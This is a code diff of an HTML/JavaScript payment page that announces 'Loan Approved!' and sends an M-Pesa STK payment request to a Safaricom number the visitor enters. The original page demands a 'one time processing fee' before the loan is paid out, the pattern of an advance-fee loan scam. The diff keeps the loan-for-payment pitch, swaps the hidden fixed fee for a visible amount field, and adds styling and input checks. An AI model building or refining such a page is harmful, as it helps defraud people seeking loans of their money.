@@ -12,6 +12,7 @@
             align-items: center;
             min-height: 100vh;
             margin: 0;
+            box-sizing: border-box;
         }
 
         .card {
@@ -21,6 +22,7 @@
             width: 75vw;
             max-width: 500px;
             box-shadow: 0 5px 20px rgba(0,0,0,0.15);
+            box-sizing: border-box;
         }
 
         h2 {
@@ -43,6 +45,20 @@
             border: 1px solid #ccc;
             border-radius: 8px;
             font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        /* Added styling to make the amount input field background black */
+        .amount-input {
+            background-color: #000000;
+            color: #ffffff;
+            border: 1px solid #000000;
+            font-weight: bold;
+        }
+
+        /* Keeps the text white when typing or clicking into the box */
+        .amount-input::placeholder {
+            color: #aaaaaa;
         }
 
         button {
@@ -54,6 +70,7 @@
             border-radius: 8px;
             cursor: pointer;
             font-size: 16px;
+            box-sizing: border-box;
         }
 
         button:hover {
@@ -72,11 +89,14 @@
 <div class="card">
 
     <h1>CONGRATULATIONS! Loan Approved!</h1>
-    <h2>Pay KES 100 One Time Processing Fee To Receive Your Loan Within 10 Minutes</h2>
-    <h4>Enter Your Mpesa Number</h4>
+    <h2>Enter Payment Details Below To Receive Your Loan Within 10 Minutes</h2>
+    <h4>Fill in your Safaricom number and amount</h4>
 
+    <!-- Phone input -->
     <input type="text" id="phone" placeholder="Enter phone e.g. 0712345678">
-    <input type="hidden" id="amount" value="100">
+    
+    <!-- Changed from type="hidden" to type="number" and added the black styling class -->
+    <input type="number" id="amount" class="amount-input" placeholder="Enter Amount (KES)" min="1">
 
     <button onclick="pay()">Pay Now</button>
 
@@ -100,13 +120,23 @@ async function pay() {
     let amount = document.getElementById("amount").value;
     let msg = document.getElementById("msg");
 
+    // Check if phone number is provided
     if (!phoneInput) {
+        msg.style.color = "red";
         msg.innerText = "Please enter phone number";
+        return;
+    }
+
+    // Check if amount is provided and is valid
+    if (!amount || amount <= 0) {
+        msg.style.color = "red";
+        msg.innerText = "Please enter a valid amount";
         return;
     }
 
     let phone = formatPhone(phoneInput);
 
+    msg.style.color = "black";
     msg.innerText = "📲 Sending STK request...";
 
     try {
